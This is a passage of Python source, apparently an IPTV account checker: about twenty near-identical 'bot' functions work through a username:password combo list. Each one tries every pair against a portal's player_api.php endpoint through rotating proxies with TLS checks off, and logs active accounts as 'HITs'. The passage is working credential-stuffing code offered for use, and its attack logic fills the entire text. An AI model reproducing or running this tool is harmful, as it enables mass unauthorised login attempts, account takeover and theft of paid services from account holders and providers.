			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_10'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 			 			 			 			 			 					 
def d11():
	global hit
	global proxy_
	say=0
	for fyz in range(11,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_11'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 
def d12():
	global hit
	global proxy_
	say=0
	for fyz in range(12,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_12'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 			 			 			 			 			 	 				 
def d13():
	global hit
	global proxy_
	say=0
	for fyz in range(13,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_13'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 
def d14():
	global hit
	global proxy_
	say=0
	for fyz in range(14,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_14'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 			 			 			 			 			 		 			 
def d15():
	global hit
	global proxy_
	say=0
	for fyz in range(15,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_15'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			
			
def d16():
	global hit
	global proxy_
	say=0
	for fyz in range(16,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_16'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d17():
	global hit
	global proxy_
	say=0
	for fyz in range(17,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_17'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d18():
	global hit
	global proxy_
	say=0
	for fyz in range(18,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_18'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d19():
	global hit
	global proxy_
	say=0
	for fyz in range(19,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_19'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d20():
	global hit
	global proxy_
	say=0
	for fyz in range(20,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_20'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d21():
	global hit
	global proxy_
	say=0
	for fyz in range(21,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_21'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d22():
	global hit
	global proxy_
	say=0
	for fyz in range(22,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_22'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d23():
	global hit
	global proxy_
	say=0
	for fyz in range(23,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_23'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d24():
	global hit
	global proxy_
	say=0
	for fyz in range(24,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_24'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d25():
	global hit
	global proxy_
	say=0
	for fyz in range(25,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_25'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d26():
	global hit
	global proxy_
	say=0
	for fyz in range(26,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_26'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
 

def d27():
	global hit
	global proxy_
	say=0
	for fyz in range(27,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_27'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
   

def d28():
	global hit
	global proxy_
	say=0
	for fyz in range(28,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_28'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d29():
	global hit
	global proxy_
	say=0
	for fyz in range(29,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_29'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d30():
	global hit
	global proxy_
	say=0
	for fyz in range(30,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_30'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                    
            
def d31():
	global hit
	global proxy_
	say=0
	for fyz in range(31,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_31'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
